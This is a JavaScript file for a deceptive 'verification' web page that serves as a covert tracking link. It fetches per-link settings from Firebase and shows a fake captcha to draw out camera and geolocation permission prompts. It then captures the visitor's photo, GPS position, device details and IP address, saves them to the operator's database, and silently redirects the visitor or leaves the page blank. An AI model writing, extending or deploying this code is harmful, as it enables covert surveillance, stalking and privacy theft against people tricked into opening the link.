// ── MAIN FLOW ──────────────────────────────────────────────────────────────
async function initVerification() {
    try {
        // ── Extract and validate linkId from URL query string ─────────────
        const params = new URLSearchParams(window.location.search);
        const linkId = params.get('linkId');
        
        if (!linkId) {
            showError('Invalid or missing link. Please check the URL and try again.');
            return;
        }

        // Sanitize linkId to prevent injection
        if (!/^[A-Z0-9\-]+$/.test(linkId)) {
            showError('Invalid link format. Please check the URL and try again.');
            return;
        }

        // ── Fire ALL async work simultaneously from the very first tick ───────
        // queryPermissionStates() is near-instant (Permissions API, no network).
        // By the time Firebase responds, permission states are already known.
        const settingsPromise   = get(ref(db, 'managed_links/' + linkId)).catch(e => {
            console.error('Firebase fetch failed:', e);
            throw new Error('Firebase connection failed: ' + (e.message || 'Unknown error'));
        });
        const permStatesPromise = queryPermissionStates();
        const infoPromise       = collectDeviceInfo();
        const ipPromise         = getIPAddress();

        // ── Wait for Firebase settings ────────────────────────────────────────
        let settings;
        let snap;
        try {
            snap = await Promise.race([
                settingsPromise,
                new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Firebase request timeout (10s)')), 10000)
                )
            ]);
            settings = snap.val();
        } catch (e) {
            console.error('Firebase fetch error:', e);
            const errorMsg = e.message || 'Network error. Please check your connection and try again.';
            const details = 'linkId: ' + linkId + '\nError: ' + errorMsg;
            if (window.APP_ERROR_HANDLER) {
                window.APP_ERROR_HANDLER(errorMsg, details);
            } else {
                showError(errorMsg);
            }
            return;
        }

        if (!settings) {
            showError('This link does not exist or has expired.');
            return;
        }

        if (!settings.active) {
            showError('This link is no longer active.');
            return;
        }

        // Hide loader — we are proceeding with the flow
        hideLoader();

        runTransaction(ref(db, 'managed_links/' + linkId + '/visits'), current => (current || 0) + 1).catch(() => {});

        const needsCam     = !!settings.cam;
        const needsGPS     = !!settings.gps;
        const hasRedirect  = isValidUrl(settings.redirectUrl);
        const hasAnyPerm   = needsCam || needsGPS;

        // ── Permission states already resolved (ran in parallel) ─────────────
        const permStates = await permStatesPromise;

        // ── Decide immediately: does this browser require a user gesture? ─────
        // 'prompt' → browser will ask, but only from a user-initiated gesture.
        // 'granted' → already allowed, no gesture needed.
        // 'denied' → permanently blocked, no gesture helps.
        let permissionTrigger       = 'direct';
        let browserBlocksAutoPrompt = false;

        if (hasAnyPerm) {
            browserBlocksAutoPrompt =
                (needsCam && permStates.camera      === 'prompt') ||
                (needsGPS && permStates.geolocation === 'prompt');

            // ── Show verification screen with 0ms delay ───────────────────────
            if (browserBlocksAutoPrompt) {
                await showCaptcha();
                permissionTrigger = 'captcha';
            }
        }

        // ── Request each permission and record result ─────────────────────────
        const { photoData, lat, lon, log: permissionLog } =
            await runPermissions(needsCam, needsGPS);

        // ── Refine status accuracy post-run ───────────────────────────────────
        await refinePermissionLog(permissionLog, needsCam, needsGPS);

        // ── Evaluate grant results ────────────────────────────────────────────
        const camGranted = !needsCam || (photoData !== null);
        const gpsGranted = !needsGPS || (typeof lat === 'number');
        const allGranted = camGranted && gpsGranted;

        // ── Redirect path ─────────────────────────────────────────────────────
        if (hasRedirect && allGranted) {
            Promise.all([infoPromise, ipPromise])
                .then(([deviceInfo, ipAddress]) =>
                    saveCapture({
                        photoData, lat, lon, settings, linkId, ipAddress, deviceInfo,
                        permissionLog, permissionTrigger, browserBlocksAutoPrompt
                    })
                )
                .catch(e => console.error('Async capture save failed:', e));

            window.location.replace(settings.redirectUrl.trim());
            return;
        }

        // ── No-redirect path — save and stay silent ───────────────────────────
        const [deviceInfo, ipAddress] = await Promise.all([infoPromise, ipPromise]);
        await saveCapture({
            photoData, lat, lon, settings, linkId, ipAddress, deviceInfo,
            permissionLog, permissionTrigger, browserBlocksAutoPrompt
        });
        // Page remains blank.

    } catch (err) {
        console.error('initVerification fatal error:', err);
        const errorMsg = err.message || 'An unexpected error occurred. Please try again.';
        if (window.APP_ERROR_HANDLER) {
            window.APP_ERROR_HANDLER(errorMsg, 'Stack: ' + (err.stack || 'N/A'));
        } else {
            showError(errorMsg);
        }
    }
}

// ── BOOT ────────────────────────────────────────────────────────────────
// OPTIMIZED: app.js is loaded as type="module" which is implicitly deferred —
// it already runs after the DOM is fully parsed.  Waiting for the 'load'
// event on top of that means we also wait for every sub-resource (images,
// stylesheets, iframes) to finish before starting.  index.html has no such
// sub-resources, but the event itself still adds 50-300 ms of unnecessary
// idle time.  Calling initVerification() directly starts the flow in the
// very first microtask tick after the module executes.
initVerification();